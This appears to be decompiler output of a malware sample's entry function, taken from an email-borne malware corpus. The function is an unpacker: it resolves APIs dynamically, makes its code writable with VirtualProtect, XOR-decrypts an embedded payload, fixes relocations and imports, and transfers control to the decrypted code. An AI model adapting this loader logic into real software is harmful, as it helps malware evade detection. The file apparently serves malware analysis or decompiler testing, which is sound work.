// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0447/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 edi)
{
fn00401000_entry:
l00401000:
	SHLWAPI.dll!StrChrA()
	Eq_3 * esi_101 = null
	branch eax == 0x00000000 l0040101D
l00401016:
	return
l0040101D:
	code * eax_39 = GetProcAddress(LoadLibraryA(0x00404074), 0x0040406C)
	eax_39()
	word32 ebp_304 = eax_39 + 0x0000001C
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040105C
l00401059:
	ebp_304 = eax_39 + 0x0000001C ^ 0x0000000E
l0040105C:
	fp->dwFFFFFFC0 = fp - 0x0000002C;
	fp->dwFFFFFFC0 = 0x00000040;
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	Eq_53 * eax_109 = null
l00401078:
	branch esi_101 != ebp_304 l00401081
l0040107F:
	esi_101 = null;
l00401081:
	eax_109->b4025E8 = esi_101->b405000 ^ eax_109->b4025E8 ^ 0xEC;
	eax_109 = eax_109 + 1;
	esi_101 = esi_101 + 1;
	branch eax_109 <u (Eq_53 *) 0x00001420 l00401078
l004010A9:
	Eq_78 * ebx_114 = &globals->t4038C8
	up32 ebp_117 = 0x00000000
	up32 dwLoc28_122 = 0x00000000
l004010D0:
	word32 eax_130 = ebx_114->dw0004
	Eq_100 * edx_138 = &ebx_114->t0008
	branch eax_130 - 0x00000008 >>u 0x00000001 <= 0x00000000 l00401111
l004010E2:
	uint32 ebp_275 = eax_130 - 0x00000008 >>u 0x00000001
l004010E4:
	branch (edx_138->w0000 & 0xF000) != 0x3000 l00401105
l004010F1:
	Eq_107 * ecx_295 = ((word32) edx_138->w0000 & 0x00000FFF) + ebx_114->dw0000
	ecx_295->dw402368 = ecx_295->dw402368 + 0xF0402368;
l00401105:
	edx_138 = edx_138 + 1;
	ebp_275 = ebp_275 - 0x00000001;
	branch ebp_275 != 0x00000000 l004010E4
l0040110D:
	ebp_117 = dwLoc28_122;
l00401111:
	ebp_117 = ebp_117 + ebx_114->dw0004;
	dwLoc28_122 = ebp_117;
	ebx_114 = ebx_114 + Mem107[ebx_114 + 0x00000004:word32];
	branch ebp_117 <u 0x000000E4 l004010D0
l00401126:
	Eq_135 * ebx_154 = &globals->t4030C4
	Eq_135 * dwLoc28_155 = &globals->t4030C4
	branch globals->dw4030D4 == 0x00000000 l004011BC
l0040113D:
	ebx_176 = ebx_154;
l00401140:
	Eq_135 * ebx_176
	Eq_11 eax_183 = LoadLibraryA(ebx_176->dw000C + 0x00402368)
	Eq_11 ecx_185 = eax_183
	branch eax_183 == 0x00000000 l004011AF
l00401156:
	Eq_154 * ebp_210 = ebx_176->ptr0000
	branch ebp_210 != null l0040115F
l0040115C:
	ebp_210 = ebx_176->ptr0010;
l0040115F:
	Eq_163 eax_216 = ebp_210->u402368
	Eq_167 * ebp_218 = &ebp_210->u402368
	word32 esi_219 = Mem107[ebx_176 + 0x00000010:word32] + 0x00402368
	branch eax_216 == 0x00000000 l004011AF
l0040116E:
	goto l00401174
l00401170:
	ecx_185 = eax_183;
l00401174:
	code * eax_243
	branch eax_216 >= 0x00000000 l00401189
l00401178:
	eax_243 = GetProcAddress(ecx_185, (word32) ebp_218->t0000);
	goto l00401195
l00401189:
	eax_243 = GetProcAddress(ecx_185, eax_216.u0);
l00401195:
	esi_219->ptr0000 = eax_243;
	ebp_218 = ebp_218 + 1;
	eax_216 = ebp_218->t0000;
	esi_219 = esi_219 + 1;
	branch eax_216 != 0x00000000 l00401170
l004011AB:
	ebx_176 = dwLoc28_155;
l004011AF:
	ebx_176 = ebx_176 + 1;
	dwLoc28_155 = ebx_176;
	branch ebx_176->ptr0010 != null l00401140
l004011BC:
	0x00402DB8()
	ExitProcess(0x00000000)
fn00401000_exit:
}

